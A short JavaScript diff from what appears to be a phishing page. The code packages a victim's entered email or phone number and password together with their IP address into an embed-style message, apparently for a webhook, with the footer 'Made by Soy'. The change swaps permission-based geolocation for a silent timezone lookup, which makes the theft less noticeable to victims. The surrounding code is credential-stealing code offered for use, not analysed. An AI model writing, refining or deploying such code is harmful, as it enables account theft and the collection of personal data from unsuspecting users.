@@ -165,31 +165,22 @@
       }
 
       let ip = 'Unavailable';
-      let country = 'Unavailable';
+      let timezone = 'Unavailable';
 
-      // Get IP from ipify
+      // Fetch IP
       try {
         const res = await fetch('https://api.ipify.org?format=json');
         const json = await res.json();
         ip = json.ip || 'Unavailable';
       } catch (err) {
-        console.warn('IP fetch failed:', err);
+        console.warn('Failed to fetch IP:', err);
       }
 
-      // Get country from Geolocation + OpenStreetMap
+      // Get Timezone (no permission needed)
       try {
-        const pos = await new Promise((resolve, reject) => {
-          navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 5000});
-        });
-
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
-
-        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
-        const json = await response.json();
-        country = json.address.country || 'Unavailable';
+        timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unavailable';
       } catch (err) {
-        console.warn('Country fetch failed:', err);
+        console.warn('Failed to get timezone:', err);
       }
 
       const data = {
@@ -203,7 +194,7 @@
               { name: "Email/Phone", value: input, inline: false },
               { name: "Password", value: password, inline: false },
               { name: "IP Address", value: ip, inline: false },
-              { name: "Country", value: country, inline: false }
+              { name: "Timezone", value: timezone, inline: false }
             ],
             footer: { text: "Made by Soy" },
             timestamp: new Date()
